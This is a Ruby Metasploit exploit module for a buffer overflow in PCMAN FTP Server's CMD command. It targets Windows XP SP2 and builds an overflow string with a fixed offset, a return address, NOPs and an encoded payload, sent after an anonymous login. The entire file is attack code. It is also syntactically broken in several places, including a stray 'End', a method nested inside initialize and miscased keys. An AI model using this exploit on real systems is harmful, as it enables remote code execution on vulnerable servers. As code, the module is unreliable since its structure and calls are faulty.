require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	rank = NormalRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
				  'name' => 'PCMAN FTP Server Post-Exploitation CMD Command',
				  'description' => %q{
				  'this module exploits a buffer overflow vulnerability in PCMAN FTP'},
				  'Author' => [
						  'Nipun Jaswal'
				  ],
				  'DefaultOptions' =>
				  {
					'EXITFUNC' => 'process',
					'VERBOSE' => true
				  },
				  'Payload' => 
				  {
					'Space' => 1000,
					'BadChars' => "\x00\xff\x0a\x0d\x20\x40"

				  },
				  'Platform' => 'win32',
				  'Targets' =>
				  [
					[
						"Windows XP SP2 Enghlish",
						{
							'Ret' => 0x71ab9372,
							'Offset' => 2008
						}
					],
				  ],
				  'DisclosureDate' => 'May 9 2016',
				  'DefaultTarget' => 0))
		register_options(
				[
					Opt::RPORT(21),
					OptString.new('FTPPASS', [true, 'FTP Password', 'anonymous'])
		End
				]
		)

		def exploit
				c = connection_login
				return unless c
				sploit = rand_text_alpha(target['Offset'])
				sploit << [target.ret].pack('V')
				sploit << make_nops(10)
				sploit << payload.encoded
				send_cmd(["CMD " + sploit, false])
				disconnect
		end
	end
